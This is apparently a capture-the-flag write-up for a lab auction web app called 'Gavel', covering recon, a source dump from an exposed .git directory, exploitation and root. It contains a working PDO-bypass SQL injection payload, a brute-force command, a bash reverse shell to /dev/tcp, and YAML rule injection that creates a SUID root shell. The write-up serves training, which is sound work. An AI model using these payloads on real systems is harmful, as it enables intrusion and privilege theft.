# Intro



Tags: #linux #WebApp #codereview #SQL-injection #BruteForce #RCE #medium
Tools used:
- gobuster (Directory enumeration)
- nikto (Directory enumeration)
- ffuf (Directory enumeration)
- git-dumper (Extracting source code from .git)
- john 

----
# Reconnaissance

## Add target to /etc/hosts
```bash
sudo sh -c "echo '10.129.242.203 gavel.htb' >> /etc/hosts"
```

## Nmap scan
```bash
sudo nmap -p- -sC -sV gavel.htb
```
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-12 12:53 CST
Nmap scan report for gavel.htb (10.129.242.203)
Host is up (0.016s latency).
Other addresses for gavel.htb (not scanned): 10.129.242.203 10.129.242.203 10.129.242.203 10.129.242.203
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1f:de:9d:84:bf:a1:64:be:1f:36:4f:ac:3c:52:15:92 (ECDSA)
|_  256 70:a5:1a:53:df:d1:d0:73:3e:9d:90:ad:c1:aa:b4:19 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Gavel Auction
| http-git: 
|   10.129.242.203:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: .. 
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.17 seconds
```

## WebApp enumeration (port 80)
## whatweb
```bash
whatweb gavel.htb
```
```bash
http://gavel.htb [200 OK] Apache[2.4.52], Bootstrap, Cookies[gavel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], HttpOnly[gavel_session], IP[10.129.242.203], JQuery, Script, Title[Gavel Auction]
```

## HTTP header
```bash
curl -I http://gavel.htb
```
```bash
HTTP/1.1 200 OK
Date: Fri, 12 Dec 2025 18:53:10 GMT
Server: Apache/2.4.52 (Ubuntu)
Set-Cookie: gavel_session=92uqcdvmpejb3etf6qmqs10fv9; path=/; HttpOnly; SameSite=Strict
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
```

## Directory Enumeration

```bash
gobuster dir -e -t50 -x php,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u gavel.htb
```
```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://gavel.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

http://gavel.htb/.php                 (Status: 403) [Size: 274]

http://gavel.htb/.html                (Status: 403) [Size: 274]

http://gavel.htb/login.php            (Status: 200) [Size: 4281]

http://gavel.htb/register.php         (Status: 200) [Size: 4485]

http://gavel.htb/admin.php            (Status: 302) [Size: 0] [--> index.php]

http://gavel.htb/assets               (Status: 301) [Size: 307] [--> http://gavel.htb/assets/]

http://gavel.htb/index.php            (Status: 200) [Size: 14045]

http://gavel.htb/rules                (Status: 301) [Size: 306] [--> http://gavel.htb/rules/]

http://gavel.htb/includes             (Status: 301) [Size: 309] [--> http://gavel.htb/includes/]

http://gavel.htb/logout.php           (Status: 302) [Size: 0] [--> index.php]

http://gavel.htb/inventory.php        (Status: 302) [Size: 0] [--> index.php]

http://gavel.htb/.html                (Status: 403) [Size: 274]

http://gavel.htb/.php                 (Status: 403) [Size: 274]

http://gavel.htb/server-status        (Status: 403) [Size: 274]

http://gavel.htb/bidding.php          (Status: 302) [Size: 0] [--> index.php]

===============================================================
Finished
===============================================================
```
we found multiple usefull directories here, but lets check with another wordlist too:

```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \  -u http://gavel.htb/FUZZ -e .php
```
Great! `.git` exists!  

### Nikto

As an alternative, nikto could also be used for this matter (revealing `.git`)
```shell
nikto -h gavel.htb -p 80
```

```shell
- Nikto v2.5.0
---------------------------------------------------------------------------
- ERROR: The -port option cannot be used with a full URI
┌─[eu-dedivip-1]─[10.10.15.152]─[ch3ckm8@htb-syir8sm7n0]─[~]
└──╼ [★]$ nikto -h gavel.htb -p 80
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.242.203
+ Target Hostname:    gavel.htb
+ Target Port:        80
+ Start Time:         2025-12-12 13:38:09 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.4.52 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017
+ /login.php: Admin login page/section found.
+ /.git/index: Git Index file may contain directory listing information.
+ /.git/HEAD: Git HEAD file found. Full repo details may be present.
+ /.git/config: Git config file found. Infos about repo details may be present.
+ 7963 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2025-12-12 13:39:33 (GMT-6) (84 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## Subdomain Enumeration
```bash
gobuster dns -d gavel.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```
```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     gavel.htb
[+] Threads:    50
[+] Timeout:    1s
[+] Wordlist:   /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================

===============================================================
Finished
===============================================================
```

## Virtual hosts Enumeration
```bash
gobuster vhost -u http://gavel.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://gavel.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
```

### Browsing

![](MediaFiles/Pasted%20image%2020251212211038.png)
### Page source

Nothing interesting found

## Extracting Source Code from Git Repository

```shell
git-dumper http://gavel.htb/.git/ ./gavel-source
```

## Understanding the web-app's source code

### Inspection process

With full access to the application’s source code, identifying vulnerabilities becomes significantly easier. The analysis focused on high-value components, particularly **admin.php**, **inventory.php**, **login.php**, and the **includes/** directory. 

Special attention was given to areas commonly associated with critical flaws, such as SQL query construction, configuration handling, authentication logic, and user-supplied data processing.

At this point, considerable time was spent understanding the overall application architecture. This involved manual code review, the use of analysis tools, AI-assisted inspection, and leveraging prior experience in PHP and web application development. 

### Findings

This effort ultimately paid off, as a detailed review of the source code uncovered multiple critical vulnerabilities:

#### **SQL Injection** 

in `inventory.php`** — the `user_id` and `sort` parameters are incorporated into SQL queries without proper sanitization, allowing arbitrary SQL execution via backtick injection.
#### **RCE**
Insecure rule handling in the admin panel** — the auction rules system dynamically creates PHP functions using `runkit_function_add()` with user-controlled input, leading to Remote Code Execution (RCE).
#### **BruteForce**

**Lack of rate limiting on sensitive endpoints** like `login.php` — enabling credential brute-force attacks.

#### summary

These findings allow us to construct a complete and reliable attack chain:  
**SQL Injection → credential extraction → admin panel access → Remote Code Execution through the dynamic rules system.**
  or
**BruteForce → credential extraction → admin panel access → Remote Code Execution through the dynamic rules system.**


---------
# Foothold

## SQL Injection for Credential Extraction

As noted earlier, **inventory.php** immediately stood out due to the way user-supplied parameters were handled. A closer inspection confirmed these concerns: both the `user_id` and `sort` parameters are passed directly into SQL queries without any sanitization or validation. This results in a classic SQL injection vulnerability, specifically exploitable via backtick injection.  
To exploit this issue, the following payload was used:

```shell
http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+`%27x`+FROM+users)y;--+-&sort=\?;--+-%00
```

### What is PDO?

**PDO** stands for **PHP Data Objects**.
It’s a **database access abstraction layer in PHP** that provides a consistent interface for interacting with different databases (MySQL, PostgreSQL, SQLite, etc.) using the same API.

#### What PDO is used for

PDO allows developers to:
- Connect to databases
- Execute SQL queries
- Use **prepared statements** to safely handle user input
- Fetch results in a structured way

Example
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```
Here, the `?` is a **placeholder**, and PDO safely binds the value to prevent SQL injection.

### Bypassing PDO protection in our case

- The application uses PDO
- The developers assume prepared statements = safe
- ==But **PDO only protects placeholders**, not raw SQL fragments==
- By abusing parsing behavior (`\?`, `%00`, backticks), we can perform bypass 

- **`\?`** — escaping the question mark interferes with PDO’s placeholder detection, as PDO identifies `?` parameters before fully parsing MySQL syntax and fails to account for the escaped variant.
- **`%00`** — the null byte triggers string truncation at the MySQL driver’s C-layer, effectively terminating the query and discarding any remaining input.

As a result, the application returns credentials for the **auctioneer** user. While the password is stored as a bcrypt hash, this presents no real obstacle beyond applying the appropriate cracking technique.

## alternatively:
## Bruteforce login page

```bash
patator http_fuzz url=http://gavel.htb/login.php method=POST body='username=auctioneer&password=FILE0' 0=wordlist.txt -x ignore:fgrep='Invalid username or password'
```

```
- Result: A 302 redirect was returned for the password midnight1. - Valid credentials obtained: 
- Username: auctioneer 
- Password: midnight1
```
great! lets login now

inventory -> nothing interesting
Bidding -> can just insert numbers, nothing more

Admin panel
 rules parameter was found vulnerable to Remote Code Execution (RCE)

## shell as www-data (RCE)
### Get auction IDs

```shell
curl -s http://gavel.htb/bidding.php -H 'Cookie: gavel_session=lnfk8ifva29oqk93fm06vgrjm2' | grep -E 'auction_id|data-auction-id' -A 2 -B 2
```

After obtaining `auction_id`, we move to the key stage — injecting the reverse shell payload. Return to the admin panel, find the **Rules** section, and edit the rule for one of the active lots.
### Insert payload

In the rule field, paste the following PHP code:
```shell
system('bash -c "bash -i >& /dev/tcp/10.10.15.152/4444 0>&1"'); return true;
```
### Trigger payload

start listener:
```shell
nc -lvnp 4444
```
Now we trigger our payload execution. Open a new terminal (netcat should still be listening in the first one) and send a POST request to the bid handler:
```shell
curl -X POST 'http://gavel.htb/includes/bid_handler.php' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Cookie: gavel_session=lnfk8ifva29oqk93fm06vgrjm2' \
  -d 'auction_id=71&bid_amount=50000'
```
success!
![](MediaFiles/Pasted%20image%2020251213141320.png)
stabilize shell first
```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Login as auctioneer user

```shell
www-data@gavel:/var/www/html/gavel/includes$ su auctioneer
su auctioneer
Password: midnight1

auctioneer@gavel:/var/www/html/gavel/includes$ 
```
grabbed user flag!

---
# Privesc

## Filesystem Enumeration

### opt
```shell
auctioneer@gavel:/var/www/html/gavel/includes$ ls -la /opt/gavel/
ls -la /opt/gavel/
total 56
drwxr-xr-x 4 root root  4096 Nov  5 12:46 .
drwxr-xr-x 3 root root  4096 Nov  5 12:46 ..
drwxr-xr-x 3 root root  4096 Nov  5 12:46 .config
-rwxr-xr-- 1 root root 35992 Oct  3 19:35 gaveld
-rw-r--r-- 1 root root   364 Sep 20 14:54 sample.yaml
drwxr-x--- 2 root root  4096 Nov  5 12:46 submission
```
the submission here indicates user input by submitting sth, lets keep that in mind for later

### /usr/local/bin/
```shell
auctioneer@gavel:/var/www/html/gavel/includes$ ls -la /usr/local/bin/
ls -la /usr/local/bin/
total 28
drwxr-xr-x  2 root root          4096 Oct  3 19:35 .
drwxr-xr-x 10 root root          4096 Sep 11  2024 ..
-rwxr-xr-x  1 root gavel-seller 17688 Oct  3 19:35 gavel-util
```
While studying the system, we discover the `gavel-util` utility in `/usr/local/bin/`. This utility allows sending YAML files with auction item descriptions. The key point: the `rule` field in YAML is processed by the same `runkit_function_add()` mechanism we used to get the reverse shell, but now the code executes with elevated privileges!

## YAML Injection
### 1. Disabling PHP Restrictions

We create a YAML file that overwrites the PHP configuration, removing all protective restrictions (`open_basedir`, `disable_functions`):

`fix_ini.yaml`
```shell
auctioneer@gavel:/var/www/html/gavel/includes$ echo 'name: fixini' > fix_ini.yaml
</gavel/includes$ echo 'name: fixini' > fix_ini.yaml
bash: fix_ini.yaml: Permission denied
auctioneer@gavel:/var/www/html/gavel/includes$ cd
cd
auctioneer@gavel:~$ echo 'name: fixini' > fix_ini.yaml
echo 'name: fixini' > fix_ini.yaml
auctioneer@gavel:~$ echo 'description: fix php ini' >> fix_ini.yaml
echo 'description: fix php ini' >> fix_ini.yaml
auctioneer@gavel:~$ echo 'image: "x.png"' >> fix_ini.yaml
echo 'image: "x.png"' >> fix_ini.yaml
auctioneer@gavel:~$ echo 'price: 1' >> fix_ini.yaml
echo 'price: 1' >> fix_ini.yaml
auctioneer@gavel:~$ echo 'rule_msg: "fixini"' >> fix_ini.yaml
echo 'rule_msg: "fixini"' >> fix_ini.yaml
auctioneer@gavel:~$ echo "rule: file_put_contents('/opt/gavel/.config/php/php.ini', \"engine=On\\ndisplay_errors=On\\nopen_basedir=\\ndisable_functions=\\n\"); return false;" >> fix_ini.yaml
<le_functions=\\n\"); return false;" >> fix_ini.yaml
```
and submit
```
auctioneer@gavel:~$ /usr/local/bin/gavel-util submit /home/auctioneer/fix_ini.yaml
<bin/gavel-util submit /home/auctioneer/fix_ini.yaml
Item submitted for review in next auction
```

### 2. Creating SUID bash

`rootshell.yaml`
```shell
auctioneer@gavel:~$ echo 'name: rootshell' > rootshell.yaml
echo 'name: rootshell' > rootshell.yaml
auctioneer@gavel:~$ echo 'description: make suid bash' >> rootshell.yaml
echo 'description: make suid bash' >> rootshell.yaml
auctioneer@gavel:~$ echo 'image: "x.png"' >> rootshell.yaml
echo 'image: "x.png"' >> rootshell.yaml
auctioneer@gavel:~$ echo 'price: 1' >> rootshell.yaml
echo 'price: 1' >> rootshell.yaml
auctioneer@gavel:~$ echo 'rule_msg: "rootshell"' >> rootshell.yaml
echo 'rule_msg: "rootshell"' >> rootshell.yaml
auctioneer@gavel:~$ echo "rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;" >> rootshell.yaml
</gavel/rootbash'); return false;" >> rootshell.yaml
```
and submit
```shell
auctioneer@gavel:~$ /usr/local/bin/gavel-util submit /home/auctioneer/rootshell.yaml
<n/gavel-util submit /home/auctioneer/rootshell.yaml
Item submitted for review in next auction
```

## Getting root privileges

```shell
auctioneer@gavel:~$ ls -l /opt/gavel/rootbash
ls -l /opt/gavel/rootbash
-rwsr-xr-x 1 root root 1396520 Dec 13 12:17 /opt/gavel/rootbash

auctioneer@gavel:~$ /opt/gavel/rootbash -p
/opt/gavel/rootbash -p

rootbash-5.1# cat root.txt
cat root.txt
605d8e14b2d47fa1eec16dee49f930a7
```

--------
# Summary



---

# Sidenotes

This one deserves a place in my notes, due to the privesc part, where understanding the inner workings of the binary (gaveld) and also its utility (/usr/local/bin/gavel-util) in order to escalate privileges.